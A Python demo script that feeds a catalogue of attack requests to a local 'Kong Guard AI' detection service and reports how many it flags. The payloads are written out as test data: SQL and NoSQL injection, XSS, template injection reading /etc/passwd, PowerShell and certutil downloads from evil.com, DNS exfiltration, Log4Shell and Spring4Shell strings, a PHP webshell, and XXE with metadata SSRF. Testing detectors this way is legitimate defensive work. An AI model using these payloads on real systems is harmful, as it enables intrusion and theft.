#!/usr/bin/env python3
"""
Kong Guard AI - Enterprise Vicious Attack Simulation Engine
The most sophisticated and dangerous attack patterns that enterprises face

This script simulates the worst-case scenarios that enterprise security teams
encounter, demonstrating Kong Guard AI's advanced detection capabilities.
"""

import asyncio
import httpx
import json
import time
import random
import base64
from datetime import datetime, timedelta
from typing import Dict, List, Any

class EnterpriseAttackEngine:
    def __init__(self, ai_service_url="http://localhost:18002"):
        self.ai_service_url = ai_service_url
        self.attack_history = []
        self.client_ips = [
            "203.0.113.42",  # Suspicious foreign IP
            "198.51.100.123",  # Known botnet IP
            "192.0.2.100",    # Compromised corporate IP
            "198.51.100.50",      # Internal lateral movement
            "233.252.0.25",    # DMZ compromise
            "185.220.100.240", # Tor exit node
            "141.98.80.15",   # VPN/Proxy service
            "5.188.10.95",    # Bulletproof hosting
            "46.161.40.127",  # C2 infrastructure
            "95.216.107.148"  # Cryptocurrency mining pool
        ]
        
    async def send_attack(self, attack_name: str, attack_data: Dict[str, Any], severity: str = "HIGH") -> Dict[str, Any]:
        """Send an attack to the AI service and return the analysis result"""
        
        print(f"\n🔥 [{datetime.now().strftime('%H:%M:%S')}] LAUNCHING: {attack_name}")
        print(f"   Severity: {severity}")
        print(f"   Target: {attack_data['features']['path']}")
        
        start_time = time.time()
        
        try:
            async with httpx.AsyncClient(timeout=30.0) as client:
                response = await client.post(
                    f"{self.ai_service_url}/analyze",
                    json=attack_data
                )
                
                processing_time = (time.time() - start_time) * 1000
                
                if response.status_code == 200:
                    result = response.json()
                    
                    print(f"   🎯 Threat Detected: {result['threat_type']}")
                    print(f"   📊 Threat Score: {result['threat_score']:.3f}")
                    print(f"   🎲 Confidence: {result['confidence']:.1%}")
                    print(f"   ⚡ Action: {result['recommended_action'].upper()}")
                    print(f"   ⏱️  Processing: {processing_time:.0f}ms")
                    
                    self.attack_history.append({
                        "timestamp": datetime.now().isoformat(),
                        "attack_name": attack_name,
                        "severity": severity,
                        "threat_score": result['threat_score'],
                        "action": result['recommended_action'],
                        "processing_time": processing_time
                    })
                    
                    return result
                else:
                    print(f"   ❌ Request failed: {response.status_code}")
                    return {"error": f"HTTP {response.status_code}"}
                    
        except Exception as e:
            print(f"   💥 Attack simulation failed: {e}")
            return {"error": str(e)}

    def get_advanced_sql_injections(self) -> List[Dict[str, Any]]:
        """Most sophisticated SQL injection attacks"""
        return [
            {
                "name": "🗃️  Time-Based Blind SQL Injection (Advanced)",
                "severity": "CRITICAL",
                "features": {
                    "method": "GET",
                    "path": "/api/products",
                    "client_ip": random.choice(self.client_ips),
                    "user_agent": "sqlmap/1.7.2#stable",
                    "requests_per_minute": 45,
                    "content_length": 0,
                    "query_param_count": 1,
                    "header_count": 8,
                    "hour_of_day": datetime.now().hour,
                    "query": "id=1' AND (SELECT * FROM (SELECT(SLEEP(5-(IF((SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)='a',0,5)))))x)--",
                    "body": ""
                },
                "context": {
                    "previous_requests": 25,
                    "failed_attempts": 12,
                    "anomaly_score": 0.95
                }
            },
            {
                "name": "🗃️  Second-Order SQL Injection",
                "severity": "CRITICAL", 
                "features": {
                    "method": "POST",
                    "path": "/api/profile/update",
                    "client_ip": random.choice(self.client_ips),
                    "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "requests_per_minute": 8,
                    "content_length": 200,
                    "query_param_count": 0,
                    "header_count": 15,
                    "hour_of_day": datetime.now().hour,
                    "query": "",
                    "body": "{\"username\": \"admin'; DROP TABLE sessions; INSERT INTO audit_log (action) VALUES ('COMPROMISED",
                }
            },
            {
                "name": "🗃️  Union-Based Data Extraction",
                "severity": "HIGH",
                "features": {
                    "method": "GET",
                    "path": "/api/search",
                    "client_ip": random.choice(self.client_ips),
                    "user_agent": "python-requests/2.28.1",
                    "requests_per_minute": 15,
                    "content_length": 0,
                    "query_param_count": 1,
                    "header_count": 4,
                    "hour_of_day": datetime.now().hour,
                    "query": "q=' UNION SELECT username,password,email,ssn,credit_card FROM users WHERE admin=1--",
                    "body": ""
                }
            },
            {
                "name": "🗃️  NoSQL Injection (MongoDB)",
                "severity": "HIGH",
                "features": {
                    "method": "POST",
                    "path": "/api/login",
                    "client_ip": random.choice(self.client_ips),
                    "user_agent": "PostmanRuntime/7.29.0",
                    "requests_per_minute": 20,
                    "content_length": 150,
                    "query_param_count": 0,
                    "header_count": 6,
                    "hour_of_day": datetime.now().hour,
                    "query": "",
                    "body": "{\"username\": {\"$ne\": null}, \"password\": {\"$regex\": \".*\"}, \"$where\": \"this.username == 'admin' || this.role == 'superuser'\"}"
                }
            }
        ]

    def get_advanced_xss_attacks(self) -> List[Dict[str, Any]]:
        """Most sophisticated XSS attacks"""
        return [
            {
                "name": "🕸️  Polymorphic XSS with DOM Clobbering",
                "severity": "CRITICAL",
                "features": {
                    "method": "POST",
                    "path": "/api/comments",
                    "client_ip": random.choice(self.client_ips),
                    "user_agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
                    "requests_per_minute": 12,
                    "content_length": 300,
                    "query_param_count": 0,
                    "header_count": 12,
                    "hour_of_day": datetime.now().hour,
                    "query": "",
                    "body": "{\"comment\": \"<form id=x></form><button form=x formaction=javascript:eval(String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41))>Click</button>\"}"
                }
            },
            {
                "name": "🕸️  Server-Side XSS (Template Injection)",
                "severity": "CRITICAL",
                "features": {
                    "method": "POST",
                    "path": "/api/email/template",
                    "client_ip": random.choice(self.client_ips),
                    "user_agent": "curl/7.68.0",
                    "requests_per_minute": 5,
                    "content_length": 200,
                    "query_param_count": 0,
                    "header_count": 4,
                    "hour_of_day": datetime.now().hour,
                    "query": "",
                    "body": "{\"template\": \"{{7*7}}{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}\"}"
                }
            },
            {
                "name": "🕸️  Mutation XSS (mXSS)",
                "severity": "HIGH",
                "features": {
                    "method": "PUT",
                    "path": "/api/profile/bio",
                    "client_ip": random.choice(self.client_ips),
                    "user_agent": "XSSHunter/1.0",
                    "requests_per_minute": 8,
                    "content_length": 180,
                    "query_param_count": 1,
                    "header_count": 7,
                    "hour_of_day": datetime.now().hour,
                    "query": "sanitize=false",
                    "body": "{\"bio\": \"<listing>&lt;img src=x onerror=alert(document.domain)&gt;</listing>\"}"
                }
            }
        ]

    def get_advanced_command_injections(self) -> List[Dict[str, Any]]:
        """Most dangerous command injection attacks"""
        return [
            {
                "name": "💻 Blind Command Injection with DNS Exfiltration",
                "severity": "CRITICAL",
                "features": {
                    "method": "POST",
                    "path": "/api/system/ping",
                    "client_ip": random.choice(self.client_ips),
                    "user_agent": "SystemAdmin/1.0",
                    "requests_per_minute": 3,
                    "content_length": 200,
                    "query_param_count": 0,
                    "header_count": 5,
                    "hour_of_day": datetime.now().hour,
                    "query": "",
                    "body": "{\"host\": \"8.8.8.8; nslookup `whoami`.`hostname`.`id`.attacker-dns.com\"}"
                }
            },
            {
                "name": "💻 PowerShell Encoded Command Injection",
                "severity": "CRITICAL",
                "features": {
                    "method": "POST",
                    "path": "/api/scripts/execute",
                    "client_ip": random.choice(self.client_ips),
                    "user_agent": "PowerShell/7.0",
                    "requests_per_minute": 2,
                    "content_length": 400,
                    "query_param_count": 0,
                    "header_count": 6,
                    "hour_of_day": datetime.now().hour,
                    "query": "",
                    "body": "{\"script\": \"powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcwBoAGUAbABsAC4AcABzADEAJwApAA==\"}"
                }
            },
            {
                "name": "💻 Living-off-the-Land Binary (LOLBins)",
                "severity": "HIGH",
                "features": {
                    "method": "POST",
                    "path": "/api/reports/generate",
                    "client_ip": random.choice(self.client_ips),
                    "user_agent": "ReportGenerator/2.1",
                    "requests_per_minute": 4,
                    "content_length": 150,
                    "query_param_count": 0,
                    "header_count": 8,
                    "hour_of_day": datetime.now().hour,
                    "query": "",
                    "body": "{\"template\": \"invoice.pdf; certutil.exe -urlcache -split -f http://evil.com/backdoor.exe backdoor.exe && backdoor.exe\"}"
                }
            }
        ]

    def get_zero_day_attacks(self) -> List[Dict[str, Any]]:
        """Zero-day and novel attack patterns"""
        return [
            {
                "name": "🎯 Log4Shell (CVE-2021-44228) Exploitation",
                "severity": "CRITICAL",
                "features": {
                    "method": "POST",
                    "path": "/api/logs/submit",
                    "client_ip": random.choice(self.client_ips),
                    "user_agent": "${jndi:ldap://evil.com/a}",
                    "requests_per_minute": 8,
                    "content_length": 300,
                    "query_param_count": 0,
                    "header_count": 5,
                    "hour_of_day": datetime.now().hour,
                    "query": "",
                    "body": "{\"message\": \"User login: ${jndi:ldap://attacker-server.com:1389/Exploit}\", \"level\": \"INFO\"}"
                }
            },
            {
                "name": "🎯 Spring4Shell (CVE-2022-22965) RCE",
                "severity": "CRITICAL",
                "features": {
                    "method": "POST",
                    "path": "/api/user/update",
                    "client_ip": random.choice(self.client_ips),
                    "user_agent": "Spring-Exploit/1.0",
                    "requests_per_minute": 5,
                    "content_length": 250,
                    "query_param_count": 0,
                    "header_count": 8,
                    "hour_of_day": datetime.now().hour,
                    "query": "",
                    "body": "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{prefix}i if(request.getParameter(\"cmd\")!=null){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } %{suffix}i&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
                }
            },
            {
                "name": "🎯 ProxyLogon Exchange Attack Chain",
                "severity": "CRITICAL",
                "features": {
                    "method": "GET",
                    "path": "/api/exchange/autodiscover",
                    "client_ip": random.choice(self.client_ips),
                    "user_agent": "ExchangeServicesClient/15.20.3198.004",
                    "requests_per_minute": 12,
                    "content_length": 0,
                    "query_param_count": 1,
                    "header_count": 10,
                    "hour_of_day": datetime.now().hour,
                    "query": "Email=administrator@victim.com&Protocol=X-BEResource=Administrator@victim.com:444/mapi/emsmdb/?MailboxId=f26bc937-b7b3-4402-b890-96c46713e5d5@victim.com",
                    "body": ""
                }
            }
        ]

    def get_business_logic_attacks(self) -> List[Dict[str, Any]]:
        """Sophisticated business logic exploitation"""
        return [
            {
                "name": "💰 Race Condition Price Manipulation",
                "severity": "HIGH",
                "features": {
                    "method": "POST",
                    "path": "/api/cart/checkout",
                    "client_ip": random.choice(self.client_ips),
                    "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
                    "requests_per_minute": 50,  # High frequency for race condition
                    "content_length": 200,
                    "query_param_count": 0,
                    "header_count": 15,
                    "hour_of_day": datetime.now().hour,
                    "query": "",
                    "body": "{\"items\": [{\"product_id\": 12345, \"quantity\": 1000000, \"price_override\": 0.01}], \"coupon\": \"RACE_CONDITION_EXPLOIT\"}"
                }
            },
            {
                "name": "💰 Negative Amount Transfer Attack",
                "severity": "CRITICAL",
                "features": {
                    "method": "POST",
                    "path": "/api/banking/transfer",
                    "client_ip": random.choice(self.client_ips),
                    "user_agent": "OnlineBanking/3.2.1",
                    "requests_per_minute": 3,
                    "content_length": 180,
                    "query_param_count": 0,
                    "header_count": 12,
                    "hour_of_day": datetime.now().hour,
                    "query": "",
                    "body": "{\"from_account\": \"123456789\", \"to_account\": \"987654321\", \"amount\": -1000000.00, \"memo\": \"Negative overflow exploit\"}"
                }
            },
            {
                "name": "💰 Integer Overflow Inventory Attack",
                "severity": "HIGH",
                "features": {
                    "method": "PUT",
                    "path": "/api/inventory/adjust",
                    "client_ip": random.choice(self.client_ips),
                    "user_agent": "InventoryBot/1.0",
                    "requests_per_minute": 15,
                    "content_length": 120,
                    "query_param_count": 0,
                    "header_count": 7,
                    "hour_of_day": datetime.now().hour,
                    "query": "",
                    "body": "{\"product_id\": \"LUXURY_ITEM_001\", \"adjustment\": 2147483647, \"reason\": \"inventory_correction\"}"
                }
            }
        ]

    def get_api_specific_attacks(self) -> List[Dict[str, Any]]:
        """Modern API-specific threats"""
        return [
            {
                "name": "🔑 JWT Algorithm Confusion Attack",
                "severity": "CRITICAL",
                "features": {
                    "method": "GET",
                    "path": "/api/admin/users",
                    "client_ip": random.choice(self.client_ips),
                    "user_agent": "JWTTool/1.0",
                    "requests_per_minute": 8,
                    "content_length": 0,
                    "query_param_count": 0,
                    "header_count": 8,
                    "hour_of_day": datetime.now().hour,
                    "query": "",
                    "body": "",
                    "headers": {
                        "Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImV4cCI6OTk5OTk5OTk5OX0."
                    }
                }
            },
            {
                "name": "🔑 GraphQL Depth Attack (DoS)",
                "severity": "HIGH",
                "features": {
                    "method": "POST",
                    "path": "/graphql",
                    "client_ip": random.choice(self.client_ips),
                    "user_agent": "GraphQL-Attacker/1.0",
                    "requests_per_minute": 20,
                    "content_length": 2000,
                    "query_param_count": 0,
                    "header_count": 6,
                    "hour_of_day": datetime.now().hour,
                    "query": "",
                    "body": "{\"query\": \"query InfiniteLoop { user { posts { comments { author { posts { comments { author { posts { comments { author { posts { comments { author { posts { comments { author { posts { comments { author { posts { comments { author { posts { comments { author { posts { comments { author { name }}}}}}}}}}}}}}}}}}}}}}}}}}}}}\"}"
                }
            },
            {
                "name": "🔑 Mass Assignment Privilege Escalation",
                "severity": "HIGH",
                "features": {
                    "method": "PUT",
                    "path": "/api/user/profile",
                    "client_ip": random.choice(self.client_ips),
                    "user_agent": "ProfileUpdater/2.0",
                    "requests_per_minute": 5,
                    "content_length": 250,
                    "query_param_count": 0,
                    "header_count": 9,
                    "hour_of_day": datetime.now().hour,
                    "query": "",
                    "body": "{\"name\": \"John Doe\", \"email\": \"john@example.com\", \"is_admin\": true, \"role\": \"superuser\", \"permissions\": [\"*\"], \"salary\": 999999, \"access_level\": \"TOP_SECRET\"}"
                }
            }
        ]

    def get_advanced_file_attacks(self) -> List[Dict[str, Any]]:
        """File upload and XXE attacks"""
        return [
            {
                "name": "📁 XXE with SSRF and File Exfiltration",
                "severity": "CRITICAL",
                "features": {
                    "method": "POST",
                    "path": "/api/documents/process",
                    "client_ip": random.choice(self.client_ips),
                    "user_agent": "XMLProcessor/1.0",
                    "requests_per_minute": 4,
                    "content_length": 400,
                    "query_param_count": 0,
                    "header_count": 6,
                    "hour_of_day": datetime.now().hour,
                    "query": "",
                    "body": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=file:///etc/passwd\"><!ENTITY ssrf SYSTEM \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\">]><document><content>&xxe;</content><metadata>&ssrf;</metadata></document>"
                }
            },
            {
                "name": "📁 Malicious File Upload with Path Traversal",
                "severity": "HIGH",
                "features": {
                    "method": "POST",
                    "path": "/api/files/upload",
                    "client_ip": random.choice(self.client_ips),
                    "user_agent": "FileUploader/3.0",
                    "requests_per_minute": 6,
                    "content_length": 300,
                    "query_param_count": 1,
                    "header_count": 8,
                    "hour_of_day": datetime.now().hour,
                    "query": "filename=../../../../../../var/www/html/shell.php",
                    "body": "<?php if(isset($_GET['cmd'])){ echo '<pre>'; $cmd = ($_GET['cmd']); system($cmd); echo '</pre>'; } ?>"
                }
            }
        ]

    def get_ransomware_patterns(self) -> List[Dict[str, Any]]:
        """Ransomware attack indicators"""
        return [
            {
                "name": "🔒 Ransomware C2 Communication",
                "severity": "CRITICAL",
                "features": {
                    "method": "POST",
                    "path": "/api/backup/status",
                    "client_ip": random.choice(self.client_ips),
                    "user_agent": "SystemBackup/1.0",
                    "requests_per_minute": 2,
                    "content_length": 200,
                    "query_param_count": 0,
                    "header_count": 5,
                    "hour_of_day": datetime.now().hour,
                    "query": "",
                    "body": "{\"host_id\": \"VICTIM-PC-001\", \"encryption_status\": \"COMPLETE\", \"files_encrypted\": 145687, \"btc_address\": \"1A2B3C4D5E6F7G8H9I0J\", \"deadline\": \"72h\"}"
                }
            },
            {
                "name": "🔒 Lateral Movement Attempt",
                "severity": "HIGH",
                "features": {
                    "method": "GET",
                    "path": "/api/network/discovery",
                    "client_ip": "198.51.100.50",  # Internal IP
                    "user_agent": "NetworkScanner/1.0",
                    "requests_per_minute": 100,
                    "content_length": 0,
                    "query_param_count": 1,
                    "header_count": 4,
                    "hour_of_day": datetime.now().hour,
                    "query": "range=198.51.100.1-198.51.100.255&ports=22,23,135,139,445,3389",
                    "body": ""
                }
            }
        ]

    def get_supply_chain_attacks(self) -> List[Dict[str, Any]]:
        """Supply chain and dependency attacks"""
        return [
            {
                "name": "📦 Dependency Confusion Attack",
                "severity": "HIGH",
                "features": {
                    "method": "POST",
                    "path": "/api/packages/install",
                    "client_ip": random.choice(self.client_ips),
                    "user_agent": "npm/8.19.2 node/v18.12.0",
                    "requests_per_minute": 5,
                    "content_length": 150,
                    "query_param_count": 0,
                    "header_count": 7,
                    "hour_of_day": datetime.now().hour,
                    "query": "",
                    "body": "{\"package\": \"internal-company-utils\", \"version\": \"99.99.99\", \"registry\": \"https://evil-registry.com\"}"
                }
            },
            {
                "name": "📦 Typosquatting Package Attack",
                "severity": "MEDIUM",
                "features": {
                    "method": "GET",
                    "path": "/api/packages/download",
                    "client_ip": random.choice(self.client_ips),
                    "user_agent": "pip/22.3",
                    "requests_per_minute": 8,
                    "content_length": 0,
                    "query_param_count": 1,
                    "header_count": 6,
                    "hour_of_day": datetime.now().hour,
                    "query": "package=requets",  # Typo of 'requests'
                    "body": ""
                }
            }
        ]

    async def run_comprehensive_attack_demo(self):
        """Run the most comprehensive enterprise attack demonstration"""
        
        print("╔══════════════════════════════════════════════════════════════════════════════╗")
        print("║               🔥 KONG GUARD AI - VICIOUS ENTERPRISE ATTACK DEMO 🔥            ║")
        print("╠══════════════════════════════════════════════════════════════════════════════╣")
        print("║  WARNING: This demo simulates the most dangerous enterprise-level attacks    ║")
        print("║  These patterns represent real threats that cost organizations millions       ║")
        print("╚══════════════════════════════════════════════════════════════════════════════╝")
        print()
        
        all_attacks = []
        
        # Collect all attack categories
        all_attacks.extend(self.get_advanced_sql_injections())
        all_attacks.extend(self.get_advanced_xss_attacks())
        all_attacks.extend(self.get_advanced_command_injections())
        all_attacks.extend(self.get_zero_day_attacks())
        all_attacks.extend(self.get_business_logic_attacks())
        all_attacks.extend(self.get_api_specific_attacks())
        all_attacks.extend(self.get_advanced_file_attacks())
        all_attacks.extend(self.get_ransomware_patterns())
        all_attacks.extend(self.get_supply_chain_attacks())
        
        print(f"📊 Total Vicious Attacks Ready: {len(all_attacks)}")
        print(f"🎯 Target AI Service: {self.ai_service_url}")
        print(f"📱 Dashboard: http://localhost:8080/simple-ai-dashboard.html")
        print()
        
        print("🚨 Starting enterprise attack demonstration in 2 seconds...")
        await asyncio.sleep(2)
        print()
        
        critical_attacks = 0
        high_attacks = 0
        blocked_attacks = 0
        
        for i, attack in enumerate(all_attacks, 1):
            print(f"\n{'='*80}")
            print(f"🎯 ATTACK {i}/{len(all_attacks)}: {attack['name']}")
            print(f"{'='*80}")
            
            # Track severity
            if attack['severity'] == 'CRITICAL':
                critical_attacks += 1
            elif attack['severity'] == 'HIGH':
                high_attacks += 1
                
            # Send attack
            result = await self.send_attack(
                attack['name'],
                {
                    'features': attack['features'],
                    'context': attack.get('context', {
                        "previous_requests": random.randint(1, 100),
                        "failed_attempts": random.randint(0, 10),
                        "anomaly_score": random.uniform(0.1, 0.9)
                    })
                },
                attack['severity']
            )
            
            if result.get('recommended_action') in ['block', 'rate_limit']:
                blocked_attacks += 1
                
            # Pause for dramatic effect and real-time dashboard updates
            await asyncio.sleep(3)
        
        # Final summary
        print("\n" + "="*80)
        print("🎉 ENTERPRISE ATTACK DEMONSTRATION COMPLETE")
        print("="*80)
        print(f"📊 Total Attacks Simulated: {len(all_attacks)}")
        print(f"🔴 Critical Threats: {critical_attacks}")
        print(f"🟡 High-Risk Threats: {high_attacks}")
        print(f"🛡️  Attacks Blocked/Limited: {blocked_attacks}")
        print(f"📈 Protection Rate: {(blocked_attacks/len(all_attacks)*100):.1f}%")
        print()
        print("🏆 KONG GUARD AI SUCCESSFULLY DETECTED ENTERPRISE-LEVEL THREATS!")
        print("🎯 Your APIs are protected against the most sophisticated attacks")
        print()

async def main():
    """Main demo execution"""
    print("🔥 Initializing Enterprise Attack Engine...")
    engine = EnterpriseAttackEngine()
    
    print("⚡ Checking AI Service connectivity...")
    try:
        async with httpx.AsyncClient() as client:
            response = await client.get("http://localhost:18002/")
            if response.status_code == 200:
                print("✅ Kong Guard AI Service is ready")
            else:
                print("❌ AI Service not responding")
                return
    except Exception as e:
        print(f"❌ Cannot connect to AI service: {e}")
        return
    
    await engine.run_comprehensive_attack_demo()

if __name__ == "__main__":
    asyncio.run(main())